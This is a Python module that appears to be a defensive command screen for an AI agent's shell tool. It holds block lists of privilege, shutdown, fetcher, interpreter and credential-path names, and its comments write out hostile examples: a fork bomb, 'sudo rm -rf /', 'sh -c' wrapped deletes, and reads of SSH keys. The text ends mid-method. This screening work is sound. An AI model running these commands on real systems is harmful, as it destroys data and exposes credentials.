"""The never-list: one data table, two readers (PRD-shell-execution §9).

**What this module is for, stated the way §9.4 asks for it.** It is defence in
depth against the plausible accident and the low-effort injection. It is **not**
a boundary against a determined adversary, and nothing here should be read as
claiming otherwise. The controls that actually hold against someone trying are
the constructed environment (§11), the scratch ``HOME`` and the OS profile
(Phase 2) — and the human reading the command. This module's job is to make the
handful of shapes that are *never* a legitimate agent action unreachable, and to
be honest in its own test corpus about everything it lets past
(``test_never_list_corpus.py``).

Two readers, different powers
-----------------------------
* **The pre-PDP lexical screen — the primary mechanism (§9.3).**
  :meth:`CommandNeverList.screen` sees the full, untruncated command string and
  **tokenises** it, so it can say "``argv[0]`` is ``sudo``", "this ``rm`` operand
  resolves to ``/``", "this pipeline's sink is an interpreter". It runs *before*
  the PEP is entered, so a hit means **no approval card is ever created**
  (AC7.1) — there is nothing to click through.
* **The ``_never`` ruleset — the floor.** :meth:`CommandNeverList.floor`
  compiles the same table for a reader that cannot tokenise. A
  ``PermissionRule`` ``fullmatch``es two globs and ANDs them
  (``policy/rules.py:148-153``); the subject half sees one opaque string, so its
  rows are coarse whole-command patterns. Kept because it survives a bug in the
  screen and it is the rung ``PdpPolicyService`` evaluates above every rule and
  every posture (``policy/service.py:328-333``), so it holds if a second call
  path is ever wired that skips the screen.

One table, two readers — never two tables, because a second table is a second
thing to keep correct and it is the copy that will be forgotten.

The parsing under the screen is ``shlex``, not ours
---------------------------------------------------
"Tokenises" above used to mean ~400 lines of hand-rolled lexer in this file. It
is now :class:`ParsedCommandLine` — ``shlex`` plus a segment split — and that
class's docstring carries the reasoning, including which of the old lexer's
three stated objections to ``shlex`` survived. The rule predicates are unchanged
in behaviour; they are shorter because what is beneath them is stdlib.

⚠️ **One judgement must stay off the tokens.** ``shlex`` does not model shell
FUNCTION DEFINITIONS: ``:(){ :|:& };:`` tokenises to ``[':', '()', '{', ':',
'|', ':', '&', '}', ';', ':']``, which is garbage for the purpose. So
:meth:`CommandNeverList._fork_bomb` reads the RAW string and must not be
"tidied up" onto the token stream. Any predicate whose hazard is a syntactic
FORM rather than an executable NAME carries the same constraint; a sweep of the
other seven found no second instance, because each of them keys on a command
name, an operand or a flag.

⚠️ A floor row is a WHOLE-COMMAND glob, not a path pattern
----------------------------------------------------------
Three mechanical facts, each verified against ``policy/rules.py`` and each the
reason an obvious authoring of this table does not work:

1. **There is one subject and it is the entire command line.**
   ``PolicySubjects.of`` folds the URN plus every top-level string argument
   (``rules.py:345-359``). ``RunCommandInput`` has exactly one command field, so
   the subject list is ``(urn, "cat ~/.ssh/id_rsa", label, grant-subject)``.
   There is no path subject for a path pattern to match against.
2. **Matching is ``fullmatch`` over that whole subject** (``rules.py:98-101``).
   So ``~/.ssh/**`` never fires on ``cat ~/.ssh/id_rsa``; ``*/.ssh/*`` does.
   Machine-checked, and pinned by ``test_never_list.py``.
3. **``Wildcard.expand`` rewrites a LEADING ``~`` / ``$HOME`` on the PATTERN
   side only** (``rules.py:104-122``); the command *text* is never expanded,
   because the child shell expands it at exec time. A row authored ``~/.ssh/**``
   is therefore rewritten to ``/Users/<me>/.ssh/**`` and can never meet the
   literal ``~`` the model typed. **Every row here begins with ``*`` or with a
   literal binary name**, and a test asserts every row survives
   ``Wildcard.expand`` byte-identically.

The pattern vocabulary is exactly: ``*`` → ``.*``, ``?`` → ``.``, everything in
``.+^${}()|[]\\`` escaped to a literal, compiled with ``re.DOTALL``
(``rules.py:125-134``). No character classes, no alternation, no anchors, no
word boundaries, and case-sensitive. ``-rf`` and ``-fr`` are two rows.

**Over-refusal here does NOT cost a click — it costs the command.** A floor hit
is unappealable by construction. That is why the rows are deliberately narrow,
why the screen (which tokenises) is the mechanism that decides, and why the
known over-refusals the rows still carry are pinned as *tests* rather than left
to be discovered: see ``test_never_list_corpus.py::KNOWN_OVER_REFUSALS``.

Ordering (§9.5)
---------------
``PermissionRuleset.evaluate`` is **last-match-wins** and ``merge``
concatenates, so the shipped floor must be merged **LAST** into ``_never`` or a
user row of ``{"pattern": "*", "action": "allow"}`` would sit after it and win.
``ShellCommandPolicyGate._pdp`` does the merge in that order
(``never=authored_never.merge(self._never_list.floor())``); this module only
supplies the rows, and ``test_never_list.py`` asserts the property end to end.
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass
from typing import ClassVar, Final

from agent_runtime.capabilities.policy.rules import (
    PermissionRule,
    PermissionRuleset,
    RuleAction,
)
from agent_runtime.capabilities.shell.contracts import (
    ShellRefusal,
    ShellRefusalReason,
)
from agent_runtime.capabilities.shell.vendored_deepagents_safety import (
    RECOMMENDED_SAFE_SHELL_COMMANDS,
    contains_dangerous_patterns,
    is_shell_command_allowed,
)


class _Note:
    """Model-facing refusal sentences, one per hazard class.

    Authored constants, never interpolated from the command: the command may
    carry connector-ingested content, and a note is model-visible output.

    Differentiated rather than collapsed to one line on purpose. The closed
    ``reason`` code stays ``COMMAND_NOT_PERMITTED`` for every one of these, so
    nothing about deployment configuration is distinguishable; what differs is
    the sentence that tells the model *which shape* it hit, which is the
    difference between one retry and six. Every line about a well-formed command
    says the refusal is permanent, because a deterministic refusal described as
    temporary sends a model into a loop it cannot win. :data:`UNPARSEABLE` is
    the one exception and says why.
    """

    _SUFFIX: Final = (
        " Nothing was run, there is no approval to ask for, and retrying will "
        "not change it."
    )

    PRIVILEGE: Final = "Commands are never run with elevated privileges." + _SUFFIX
    DESTRUCTIVE_DELETE: Final = (
        "A recursive delete of the filesystem root or the home directory is "
        "never permitted." + _SUFFIX
    )
    FILESYSTEM_DESTRUCTION: Final = (
        "Commands that write to a raw device or format a filesystem are never "
        "permitted." + _SUFFIX
    )
    MACHINE_STATE: Final = (
        "Commands that shut down, reboot or halt the machine are never "
        "permitted." + _SUFFIX
    )
    FORK_BOMB: Final = "That command is a fork bomb and is never permitted." + _SUFFIX
    #: The one note that does NOT end in :data:`_SUFFIX`, and deliberately so.
    #: Every other sentence here describes a permanent judgement about a
    #: well-formed command; this one describes a command we could not read.
    #: Telling the model "retrying will not change it" would be false — closing
    #: the quote changes it — and a refusal note that misdescribes the fix is
    #: how a model burns a turn re-sending the identical broken string.
    UNPARSEABLE: Final = (
        "That command has an unbalanced quote or a dangling escape, so it could "
        "not be read and nothing was run. Re-sending the same text will not "
        "change it; send the command again with the quoting closed."
    )
    PIPE_TO_INTERPRETER: Final = (
        "Piping a download straight into an interpreter is never permitted. "
        "Download to a file, and the file can then be read before anything "
        "runs it." + _SUFFIX
    )
    CREDENTIAL_PATH: Final = (
        "That command names a credential directory, which is never readable "
        "through a command." + _SUFFIX
    )
    CREDENTIAL_FILE: Final = (
        "That command names a credential or key file, which is never readable "
        "through a command." + _SUFFIX
    )


class SensitivePathPolicy:
    """The credential-path and credential-filename policy — **a duplicate**.

    ⚠️ **Change this together with**
    ``apps/desktop/main/capabilities/path-validation.ts``:
    ``SENSITIVE_ROOT_SEGMENTS`` (``:313-323``), ``SENSITIVE_FILE_RULES``
    (``:854-871``) and ``isSensitiveFileName`` (``:879-890``). Python cannot
    import TypeScript and ``packages/service-contracts`` is Python-only, so this
    is the SIWE precedent — a byte-identical duplicate with a "change both
    together" comment (root ``CLAUDE.md``). **The divergence is not left to a
    comment**: ``test_never_list.py::TestTypeScriptParity`` parses the ``.ts``
    file and asserts these three tables equal it, so drift reds CI rather than
    silently un-refusing a credential file.

    §5 recommends option 2 (ship the JSON in ``service-contracts`` and assert
    equality from a desktop test) and records it as **OQ-3, unresolved**. This
    module deliberately does not invent that cross-language artefact ahead of
    the sign-off; it takes the already-accepted pattern and adds the equality
    test, which is the half of option 2 that carries the actual guarantee.

    Why a command must obey a *read* rule: the broker already refuses to return
    these files' contents, and a command must not be the way around a rule the
    read path enforces.
    """

    #: Directory basenames that must never appear anywhere in a path.
    #: Case-INSENSITIVE in the TypeScript source (``s.toLowerCase()``), so this
    #: screen lowercases too. The floor cannot: ``Wildcard.match`` is
    #: case-sensitive. See :meth:`CommandNeverList._segment_rows`.
    ROOT_SEGMENTS: Final = (
        ".ssh",
        ".aws",
        ".gnupg",
        ".gpg",
        ".password-store",
        ".docker",
        ".kube",
        ".azure",
        "keychains",
    )

    #: Suffixes denoting key / certificate / keystore material. ``endsWith``.
    FILE_SUFFIXES: Final = (
        ".pem",
        ".key",
        ".p12",
        ".pfx",
        ".pkcs12",
        ".keystore",
        ".keychain",
        ".asc",
        ".ppk",
    )

    #: Prefixes for conventional SSH private-key files. ``startsWith``.
    FILE_PREFIXES: Final = ("id_rsa", "id_ed25519", "id_dsa", "id_ecdsa")

    #: Exact credential-store filenames. Equality.
    FILE_EXACT: Final = (
        "credentials",
        ".netrc",
        ".pgpass",
        ".htpasswd",
        ".dockercfg",
    )

    #: ``isSensitiveFileName``'s first check, special-cased there and here:
    #: ``.env`` itself plus every ``.env.<variant>``. It is not a suffix, a
    #: prefix or an exact entry, so nothing else in this class covers it.
    DOTENV: Final = ".env"

    @classmethod
    def is_sensitive_file_name(cls, name: str) -> bool:
        """Port of ``isSensitiveFileName`` (``path-validation.ts:879-890``).

        The three groups use three DIFFERENT predicates and that difference is
        load-bearing both here and in the floor rows: ``prefixes`` is
        ``startsWith``, ``suffixes`` is ``endsWith``, ``exact`` is equality.
        """

        lower = name.lower()
        if lower == cls.DOTENV or lower.startswith(f"{cls.DOTENV}."):
            return True
        if lower in cls.FILE_EXACT:
            return True
        if lower.startswith(cls.FILE_PREFIXES):
            return True
        return lower.endswith(cls.FILE_SUFFIXES)

    @classmethod
    def has_sensitive_segment(cls, token: str) -> bool:
        """True when any ``/``-separated part of ``token`` is a credential dir.

        Backslashes are folded to ``/`` first, mirroring ``Wildcard.match``'s
        own ``value.replace("\\\\", "/")`` (``rules.py:101``) so the screen and
        the floor agree about what a path separator is.
        """

        folded = token.replace("\\", "/")
        return any(part.lower() in cls.ROOT_SEGMENTS for part in folded.split("/"))

    @classmethod
    def leaf_is_sensitive(cls, token: str) -> bool:
        """True when ``token``'s leaf name satisfies :meth:`is_sensitive_file_name`."""

        folded = token.replace("\\", "/")
        return cls.is_sensitive_file_name(folded.rsplit("/", 1)[-1])


@dataclass(frozen=True, slots=True)
class CommandSegment:
    """One command in the line, plus the operator that introduced it.

    ``lead`` is ``""`` for the first segment and otherwise the operator token
    that preceded it, which is how
    :meth:`CommandNeverList._pipe_to_interpreter` tells a pipeline (``|``) from
    a list (``&&``, ``;``) without re-parsing. ``argv`` is already dequoted —
    ``shlex`` in POSIX mode removed the quoting, which is exactly what hazard
    detection wants (``"sudo" rm`` really does invoke ``sudo``) and exactly what
    :meth:`CommandNeverList.always_grant_patterns` must NOT have, so that method
    reads :attr:`ParsedCommandLine.first_word` instead.
    """

    #: Reserved words and wrapper binaries that are followed by the command
    #: actually being run. Skipping them WIDENS hazard detection (``time sudo
    #: x`` is a ``sudo`` invocation) and is safe in that direction only — §8.3's
    #: always-grant deliberately does NOT see through them.
    INTRODUCERS: ClassVar[frozenset[str]] = frozenset(
        {
            "if",
            "then",
            "else",
            "elif",
            "while",
            "until",
            "do",
            "!",
            "{",
            "}",
            "time",
            "env",
            "nice",
            "nohup",
            "xargs",
            "timeout",
            "stdbuf",
            "script",
        }
    )
    _ASSIGNMENT: ClassVar[re.Pattern[str]] = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")

    lead: str
    argv: tuple[str, ...]
    redirect_targets: tuple[str, ...] = ()

    @classmethod
    def is_assignment(cls, word: str) -> bool:
        """True for a ``NAME=value`` prefix, which is not the command."""

        return cls._ASSIGNMENT.match(word) is not None

    @property
    def candidates(self) -> tuple[str, ...]:
        """The words in this segment that could be the command being run.

        Command position is the one property the ``_never`` floor cannot
        express, and it is what separates ``sudo rm -rf /`` from
        ``git commit -m "no sudo here"``: a glob with no word boundaries cannot
        tell a binary from a substring.

        Assignment prefixes are skipped (``FOO=1 sudo x`` runs ``sudo``), and so
        is each :data:`INTRODUCERS` word together with its own flags, so the
        walk keeps going until it reaches something that is not a wrapper. Every
        word it passed through is returned, not just the last, because ``xargs``
        is itself worth refusing in some classes and ``sudo`` is worth refusing
        in all of them.
        """

        found: list[str] = []
        walking = False
        for word in self.argv:
            if self.is_assignment(word) or word.startswith("-"):
                continue
            if walking and word[:1].isdigit():
                # A wrapper's own operand: the ``5`` in ``nice -n 5 pytest``,
                # the ``30`` in ``timeout 30 pytest``. Only skipped once a
                # wrapper has been passed, so a command whose name starts with a
                # digit (``7z``) is still read as the command.
                continue
            found.append(word)
            if word not in self.INTRODUCERS:
                break
            walking = True
        return tuple(found)

    def operands(self, after: str) -> tuple[str, ...]:
        """Non-flag words following the ``after`` word.

        Everything after a bare ``--`` is an operand, matching the convention
        every one of these binaries follows.
        """

        if after not in self.argv:
            return ()
        found: list[str] = []
        end_of_flags = False
        for word in self.argv[self.argv.index(after) + 1 :]:
            if word == "--":
                end_of_flags = True
                continue
            if not end_of_flags and word.startswith("-"):
                continue
            found.append(word)
        return tuple(found)

    @property
    def short_flags(self) -> frozenset[str]:
        """Every letter in every ``-abc`` cluster, plus every ``--long`` word."""

        letters: set[str] = set()
        for word in self.argv:
            if word.startswith("--"):
                letters.add(word)
            elif word.startswith("-") and len(word) > 1:
                letters.update(word[1:])
        return frozenset(letters)


class ParsedCommandLine:
    """Command-position structure over a ``shlex``-tokenised line.

    **Nothing here is a hand-rolled lexer, and that is the point.** It used to
    be: ~400 lines of ``CommandToken`` / ``CommandLexer`` / ``_read_single`` /
    ``_read_double`` / ``_operator_at`` / ``_split``, carrying a docstring that
    gave three reasons ``shlex`` would not do. Two of the three dissolved under
    inspection and the third costs four lines:

    1. *"shlex.split raises on an unbalanced quote."* It does — and the answer
       is to CATCH it and fail **closed** (:attr:`malformed`). A line the shell
       itself would reject as a syntax error is not a line we owe a parse, and
       refusing it is strictly safer than the old lexer's run-to-end-of-string.
       Upstream ``deepagents_code`` catches the same ``ValueError`` and returns
       "not allowed" for the same reason.
    2. *"shlex discards operators, and* ``&&`` *vs* ``|`` *is the distinction
       §8.3 is built on."* True only of the ``shlex.split`` convenience wrapper.
       ``shlex.shlex(punctuation_chars=…)`` emits operators as their own tokens,
       so the distinction survives.

       ⚠️ It does **not** survive upstream's four-line
       ``re.split(r"&&|\\|\\||[|;]", …)``-then-``shlex.split`` composition, and
       this is the one place we deliberately do NOT copy ``deepagents_code``.
       Splitting the raw string first splits **inside quotes**, so each half
       carries an unbalanced quote and the parse fails — every one of the seven
       ordinary commands in
       ``test_never_list.py::TestWhyNotUpstreamsFourLineComposition``
       (``git commit -m "fix; drop the table"``, ``grep -R "foo|bar" .``,
       ``echo "a && b"`` among them) comes back ``ValueError`` under it. For
       upstream that is harmless, because failing closed on an ALLOW-list only
       means "ask the human". Here it would mean :meth:`CommandNeverList.screen`
       refusing a well-quoted command unappealably, with a note telling the
       author to fix quoting that was never broken. Quoting must be applied
       FIRST; that is the whole reason this is ``shlex.shlex`` and not the
       shorter composition.
    3. *"shlex cannot report the raw spelling of a token."* This one **survives**
       — and it costs a second ``_lex`` at ``posix=False`` rather than a lexer.
       Both streams are load-bearing in opposite directions: only the verbatim
       one still reads ``cat C:\\Users\\me\\.ssh\\id_rsa`` as a path (POSIX mode
       eats the backslashes), and only the dequoted one sees ``.env`` in
       ``cat '.env'``. See :attr:`spellings` and :attr:`first_word`.

       The second stream turned out to be load-bearing for a fourth reason
       nobody predicted, and it is the one that would have shipped a hole:
       **the POSIX stream cannot tell a quoted operator from a real one**, so
       segmenting it alone passed ``rm -rf '|' /``. :attr:`segments` carries
       both parses because of it.

    ``punctuation_chars`` is extended past ``shlex``'s default ``();<>|&`` with
    the backtick and the two line terminators, because all three open a command
    position and none is punctuation to ``shlex``. ``whitespace`` is narrowed to
    space and tab for the same reason — a newline must reach the token stream as
    a separator rather than be eaten as whitespace, or ``pytest\\nsudo ls`` reads
    as one command with two arguments.
    """

    #: Characters ``shlex`` returns as their own tokens. Consecutive runs come
    #: back as ONE token (``&&``, ``>>``, ``()``, ``|||``), which is why the
    #: classifiers below test characters rather than whole strings.
    _PUNCTUATION: Final = "();<>|&`\n\r"
    #: Narrowed from ``shlex``'s default ``" \t\r\n"`` so ``\n`` and ``\r`` stay
    #: punctuation instead of being eaten as whitespace.
    _TOKEN_WHITESPACE: Final = " \t"
    #: A punctuation run containing either of these is a REDIRECTION, whose next
    #: word is a target and never a command — so ``echo x > sudo`` does not read
    #: as running ``sudo``, and so the target is available to the raw-device
    #: check. Tested BEFORE the separator case, so ``>&`` is a redirection.
    _REDIRECTION_CHARS: Final = "<>"

    __slots__ = ("_malformed", "_operators", "_raw_words", "_segments", "_words")

    def __init__(self, command: str) -> None:
        posix = self._lex(command, posix=True)
        verbatim = self._lex(command, posix=False)
        # ``malformed`` is the POSIX answer alone, deliberately. It means "the
        # shell itself would reject this line", and only the POSIX lex is
        # faithful enough to say so: the verbatim lex raises on ordinary
        # commands such as ``rm -rf x'|'y /`` (see :meth:`_lex`), and a
        # verbatim-driven refusal would be an unappealable no to a line that is
        # perfectly valid.
        self._malformed = posix is None
        posix_tokens = posix or ()
        # The operator list answers "is this ONE simple command", which is a
        # question about the line the SHELL sees — so it reads the POSIX stream,
        # where quoting has been applied.
        self._operators = tuple(
            token for token in posix_tokens if self._is_operator(token)
        )
        self._words = tuple(
            token for token in posix_tokens if not self._is_operator(token)
        )
        verbatim_tokens = verbatim or ()
        self._raw_words = tuple(
            token for token in verbatim_tokens if not self._is_operator(token)
        )
        # Both parses, but only once when they agree — which is the ordinary
        # case, since the two differ only over quoting that contains an
        # operator character. A verbatim lex that RAISED contributes nothing:
        # its empty segment would carry no candidates, and ``malformed`` has
        # already decided that a genuinely unparseable line is refused.
        # See :attr:`segments`.
        faithful = self._split(posix_tokens, verbatim=False)
        second = () if verbatim is None else self._split(verbatim_tokens, verbatim=True)
        self._segments = faithful if second in ((), faithful) else faithful + second

    @classmethod
    def of(cls, command: str) -> "ParsedCommandLine":
        """Tokenise and structure ``command``. Never raises."""

        return cls(command)

    @property
    def malformed(self) -> bool:
        """True when the line does not tokenise — unbalanced quote, dangling escape.

        The narrowing answer rather than an exception: the ``CommandNeverList``
        Protocol ``policy_gate`` declares is total, so a line we cannot parse
        becomes a REFUSAL upstream, never a broken run.
        """

        return self._malformed

    @property
    def segments(self) -> tuple[CommandSegment, ...]:
        """Both parses' segments, concatenated. A hazard in **either** is a hazard.

        ⚠️ This is not belt-and-braces. The two streams get quoting wrong in
        OPPOSITE directions, and each direction has a measured case where the
        error cuts an operand away from its command and the hazard stops being
        visible at all:

        * the POSIX stream has already discarded the quotes, so ``rm -rf '|' /``
          arrives as ``('rm', '-rf', '|', '/')``, the third token reads as a
          real pipe, and ``/`` lands in a different segment from ``rm``. The old
          hand-rolled lexer refused that line; segmenting the POSIX stream alone
          passed it;
        * the verbatim stream keeps the quotes, but ``shlex`` in non-POSIX mode
          only enters quote state at the START of a token — so a MID-word quote
          is copied literally and ``awk -F';' …`` splits at a ``;`` the shell
          would never see, which cuts operands away exactly the same way.

        Neither stream dominates, so the fail-closed reading is the union.
        Detectors iterate this tuple and stop at the first hit, so a hazard seen
        in either parse is refused. The cost is over-refusal on lines where the
        two disagree — measured, that is escaped operators (``echo a\\;sudo``) —
        which is the direction tier NEVER is allowed to err in.

        The concatenation is safe for :meth:`CommandNeverList._pipe_to_interpreter`,
        whose ``fetched`` flag carries across segments, because :meth:`_split`
        always emits its first segment with an empty ``lead`` — so the second
        parse resets the carry rather than joining the first parse's tail.
        """

        return self._segments

    @property
    def operators(self) -> tuple[str, ...]:
        """Every control / redirection operator token, in order."""

        return self._operators

    @property
    def spellings(self) -> tuple[str, ...]:
        """Every word, in BOTH the dequoted and the verbatim spelling.

        The two credential detectors ask "does any word name a credential",
        which is a set question — so this is a flat concatenation rather than an
        aligned pairing, and it has to be, because the two streams are not
        alignable in general (``a\\ b`` is one token in POSIX mode and two
        without it). It is deliberately NOT deduplicated: the union is also what
        ``test_never_list.py`` subtracts from the command to assert that no
        character of the input is invisible to this scan, and a dedup would make
        that property untestable to save nothing on a list this short.

        Both spellings are load-bearing, in OPPOSITE directions, and each has a
        test pinning the case only it catches:

        * POSIX mode strips the escapes from ``C:\\Users\\me\\.ssh\\id_rsa``
          exactly as the shell does, leaving ``C:Usersme.sshid_rsa`` — so only
          the **verbatim** spelling still reads as a path;
        * the verbatim spelling of ``cat '.env'`` keeps the quotes, so ``.env``
          is not the leaf name — only the **dequoted** spelling matches.
        """

        return (*self._words, *self._raw_words)

    @property
    def first_word(self) -> tuple[str, str] | None:
        """``argv[0]`` as ``(dequoted, verbatim)``, or ``None`` when there is none.

        The one place the two spellings are COMPARED rather than unioned. §8.3
        may only offer a run-scoped grant for a command whose literal text is
        what a glob will later be matched against, so a head that quoting
        changed — ``"sudo" rm``, ``s'u'do rm`` — forfeits it. Both of those
        dequote to ``sudo``, which is why comparing the two spellings is the
        check and a prefix test on the raw string is not.
        """

        if not self._words or not self._raw_words:
            return None
        return self._words[0], self._raw_words[0]

    @classmethod
    def _lex(cls, command: str, *, posix: bool) -> tuple[str, ...] | None:
        """``shlex`` tokens, or ``None`` when the line cannot be parsed.

        ⚠️ ``commenters`` is cleared, and that line is load-bearing. ``shlex``
        defaults it to ``#`` and implements a comment by calling
        ``instream.readline()`` — which swallows the rest of the line
        **including its newline**. Since a newline is a separator here and not
        whitespace (see :data:`_TOKEN_WHITESPACE`), the default made
        ``echo hi #c\\nsudo rm -rf /`` tokenise as ONE segment with ``sudo`` in
        argument position rather than command position, and the screen passed
        it. Machine-checked, and pinned by ``test_never_list.py``. With ``#``
        an ordinary word character the same line splits at the newline and
        ``sudo`` is refused; a genuine trailing comment merely becomes an
        operand, which no detector reads as a command.
        """

        lexer = shlex.shlex(command, posix=posix, punctuation_chars=cls._PUNCTUATION)
        lexer.whitespace = cls._TOKEN_WHITESPACE
        lexer.whitespace_split = True
        lexer.commenters = ""
        try:
            return tuple(lexer)
        except ValueError:
            return None

    @staticmethod
    def _dequote(token: str) -> str:
        """One verbatim token with its quoting removed, or unchanged on failure.

        A verbatim token contains no unquoted whitespace by construction, so
        ``shlex.split`` returns exactly one element or raises. The failure case
        is a dangling escape (``a\\``), which the whole-line POSIX lex has
        already reported as :attr:`malformed`; returning the token unchanged
        keeps this total rather than adding a second way to signal the same
        thing.
        """

        try:
            return "".join(shlex.split(token))
        except ValueError:
            return token

    @classmethod
    def _is_operator(cls, token: str) -> bool:
        """True for a token made entirely of punctuation characters.

        Correct on the verbatim stream and only approximate on the POSIX one,
        which is the asymmetry :attr:`segments` exists to absorb: a token that
        is a QUOTED operator and nothing else (``echo '|'``) has already had its
        quotes removed by POSIX tokenising and is indistinguishable here from a
        real one. Splitting there is not merely a widening — it also cuts the
        operands that follow away from the command that owns them, which is how
        ``rm -rf '|' /`` came to pass a screen the old lexer refused. The
        verbatim stream still holds ``"'|'"``, which is not a punctuation run,
        so asking both parses recovers it.
        """

        return bool(token) and all(char in cls._PUNCTUATION for char in token)

    @classmethod
    def _is_redirection(cls, token: str) -> bool:
        """True for a punctuation run that redirects rather than separates."""

        return any(char in cls._REDIRECTION_CHARS for char in token)

    @classmethod
    def _split(
        cls, tokens: tuple[str, ...], *, verbatim: bool
    ) -> tuple[CommandSegment, ...]:
        """Group one token stream into segments; dequote words if ``verbatim``.

        A redirection does NOT start a new segment: it consumes exactly the one
        word that follows it and the rest of the line stays with the command it
        belongs to, so ``rm -rf > /tmp/log /`` still has ``/`` among ``rm``'s
        operands.

        On the verbatim stream the classification happens BEFORE the dequoting,
        which is the whole reason that stream is segmented at all — see
        :attr:`segments` for why one stream is not enough.
        """

        segments: list[CommandSegment] = []
        lead = ""
        argv: list[str] = []
        targets: list[str] = []
        pending_target = False

        for token in tokens:
            if cls._is_operator(token):
                if cls._is_redirection(token):
                    pending_target = True
                    continue
                segments.append(
                    CommandSegment(
                        lead=lead, argv=tuple(argv), redirect_targets=tuple(targets)
                    )
                )
                lead, argv, targets, pending_target = token, [], [], False
                continue
            word = cls._dequote(token) if verbatim else token
            if pending_target:
                targets.append(word)
                pending_target = False
                continue
            argv.append(word)

        segments.append(
            CommandSegment(lead=lead, argv=tuple(argv), redirect_targets=tuple(targets))
        )
        return tuple(segments)


class CommandNeverList:
    """The §9 floor: the tokenising screen, the compiled rows, the grant patterns.

    Implements the ``CommandNeverList`` Protocol that
    ``capabilities/shell/policy_gate.py`` declares. Every method is total; a
    line that cannot be parsed returns the narrowing answer
    (:attr:`ParsedCommandLine.malformed` ⇒ a refusal) rather than raising into
    the tool path.

    ⚠️ **Three tiers, and only two of them live here.** The names in this file
    and the names in ``vendored_deepagents_safety`` answer different questions,
    and reading one as the other would ship a severe regression:

    ``NEVER``
        Refuse outright; no human may approve. :meth:`screen` and :meth:`floor`.
        Credential paths, ``sudo``, ``rm -rf /``, fork bombs, ``mkfs``,
        pipe-to-interpreter.
    ``ASK``
        Run it, but a human approves it. **This is where** ``pytest``,
        ``npm test``, ``git status`` **and** ``make`` **live**, and it is the
        whole product promise of Phase 1. Everything not caught by tier NEVER is
        in this tier today.
    ``AUTO``
        Safe enough to run without asking — :meth:`auto_approvable`, and
        **nothing in this repository consults it yet**. See that method for why
        wiring it as the gate would be a blocker-grade regression.
    """

    # -- hazard vocabulary -------------------------------------------------

    _PRIVILEGE: Final = frozenset({"sudo", "doas", "su"})
    #: ``-S`` makes ``sudo`` read a password from stdin. We close stdin, so this
    #: is credential brute-forcing rather than an invocation (Hermes
    #: ``approval.py:486-515``). Checked anywhere, not only in command position.
    _STDIN_PASSWORD_FLAG: Final = "S"
    _MACHINE_STATE: Final = frozenset({"shutdown", "reboot", "halt", "poweroff"})
    _SYSTEMCTL: Final = "systemctl"
    _SYSTEMCTL_TARGETS: Final = frozenset({"poweroff", "reboot", "halt"})
    _INIT: Final = "init"
    _INIT_RUNLEVELS: Final = frozenset({"0", "6"})
    _REMOVE: Final = "rm"
    _RECURSIVE_FLAGS: Final = frozenset({"r", "R", "--recursive"})
    #: The whole set of operands that make a recursive delete catastrophic,
    #: after :meth:`_normalise_operand` has stripped a trailing ``/`` or ``/*``.
    _CATASTROPHIC_ROOTS: Final = frozenset({"/", "~", "$HOME", "${HOME}"})
    _MKFS: Final = "mkfs"
    _DD: Final = "dd"
    _DD_OUTPUT: Final = "of="
    _DEVICE_ROOT: Final = "/dev/"
    #: Raw block devices. ``rdisk`` is macOS's raw device node and is the one
    #: that matters on the platform this app ships on; §9.2 lists
    #: ``disk|sd|nvme`` and the addition is called out in the report.
    _RAW_DEVICES: Final = ("disk", "rdisk", "sd", "nvme", "hd", "vd")
    _FETCHERS: Final = frozenset({"curl", "wget", "iwr", "invoke-webrequest", "aria2c"})
    _INTERPRETERS: Final = frozenset(
        {
            "sh",
            "bash",
            "zsh",
            "dash",
            "ksh",
            "fish",
            "csh",
            "tcsh",
            "perl",
            "ruby",
            "node",
            "deno",
            "bun",
            "php",
            "osascript",
            "pwsh",
            "powershell",
            "iex",
        }
    )
    _INTERPRETER_PREFIX: Final = "python"
    _PIPE_OPERATORS: Final = frozenset({"|", "|&"})
    #: ADDED (not in §9.2). A shell invoked with ``-c`` carries a whole command
    #: line inside ONE quoted word, so every tokenising judgement above is blind
    #: to it and every end-anchored floor row misses it too: machine-checked,
    #: ``sh -c "rm -rf /"`` passed both readers before this. One level of
    #: recursion closes it; the payload is screened as what it is, a command
    #: line, so this adds no false-positive shape that the top level does not
    #: already have.
    _SHELL_BINARIES: Final = frozenset(
        {"sh", "bash", "zsh", "dash", "ksh", "fish", "csh", "tcsh"}
    )
    #: The short-flag letter that means "the next operand is a command string".
    #: Matched inside a cluster so ``bash -lc "…"`` is seen as well as ``-c``.
    _COMMAND_STRING_FLAG: Final = "c"
    #: One level only. A shell inside a shell inside a shell is not a shape we
    #: owe coverage to, and an unbounded walk is an unbounded loop on the tool
    #: path.
    _MAX_NESTED_DEPTH: Final = 1
    #: ``name () { ... }`` with a body that pipes the name into itself and
    #: backgrounds it. Every metacharacter is matched literally; the body is
    #: bounded so a pathological line cannot make this quadratic.
    _FORK_BOMB: ClassVar[re.Pattern[str]] = re.compile(
        r"([^\s(){};|&]{1,32})\s*\(\s*\)\s*\{(.{0,256}?)\}", re.DOTALL
    )
    #: Binaries that forfeit the §8.3 always-grant because ``argv[0]`` is not
    #: the command actually being run. §8.3's list verbatim, with ``make``
    #: resolved IN (OQ-2, the narrowing direction: it runs a file the agent may
    #: have written), plus the additions marked below.
    _WRAPPER_BINARIES: Final = frozenset(
        {
            "env",
            "sh",
            "bash",
            "zsh",
            "sudo",
            "doas",
            "nice",
            "nohup",
            "xargs",
            "time",
            "timeout",
            "script",
            "ssh",
            "docker",
            "make",
            # additions, each the same class as an entry above:
            "su",
            "dash",
            "ksh",
            "fish",  # other spellings of "a shell"
            "command",
            "exec",
            "eval",
            "builtin",  # POSIX re-dispatchers
            "npx",
            "bunx",
            "uvx",
            "pipx",  # fetch-then-run launchers
        }
    )
    #: Characters that cannot appear in an ``argv[0]`` a grant pattern is built
    #: from. ``*`` and ``?`` are the only two ``_compile`` treats as
    #: metacharacters, so either would silently widen the grant to everything.
    _PATTERN_METACHARACTERS: Final = "*?"
    #: Tier AUTO's allow-list, upstream's table verbatim. Held as a list because
    #: that is ``is_shell_command_allowed``'s parameter type, and built once so
    #: the vendored predicate is not handed a fresh list per call. Consulted
    #: ONLY by :meth:`auto_approvable` — see that method for why.
    _AUTO_SAFE: ClassVar[list[str]] = list(RECOMMENDED_SAFE_SHELL_COMMANDS)

    _floor_rules: ClassVar[PermissionRuleset | None] = None

    # -- the Protocol ------------------------------------------------------

    def screen(self, command: str) -> ShellRefusal | None:
        """The §9.3 lexical screen. A refusal means **no card is ever drawn**.

